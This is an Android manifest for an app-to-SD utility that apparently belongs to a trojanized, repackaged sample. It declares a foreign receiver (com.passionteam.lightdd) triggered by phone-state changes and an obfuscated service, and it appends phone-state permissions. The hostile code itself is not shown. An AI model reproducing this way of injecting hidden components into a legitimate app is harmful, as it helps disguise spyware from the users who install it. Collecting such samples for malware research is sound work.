<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.a0soft.gphone.super.app2sd">
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.PERSISTENT_ACTIVITY"/>
    <application android:icon="@drawable/icon_free" android:label="@string/app_name" android:name="com.a0soft.gphone.app2sd.free.MainApp">
        <activity android:name="com.a0soft.gphone.app2sd.free.MainWnd" android:theme="@style/MyTheme">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.a0soft.gphone.app2sd.main.TopWnd" android:theme="@style/MyTheme_NoBackground"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.NotiWnd" android:theme="@style/MyTheme"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.OnPhoneWnd" android:theme="@style/MyTheme_NoBackground"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.OnSDWnd" android:theme="@style/MyTheme_NoBackground"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.NoMoveWnd" android:theme="@style/MyTheme_NoBackground"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.PrefWnd" android:theme="@style/MyTheme"/>
        <activity android:name="com.a0soft.gphone.app2sd.main.AboutWnd" android:theme="@style/MyTheme"/>
        <receiver android:name="com.a0soft.gphone.app2sd.main.PkgChangedRecv">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="bZ$iX"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>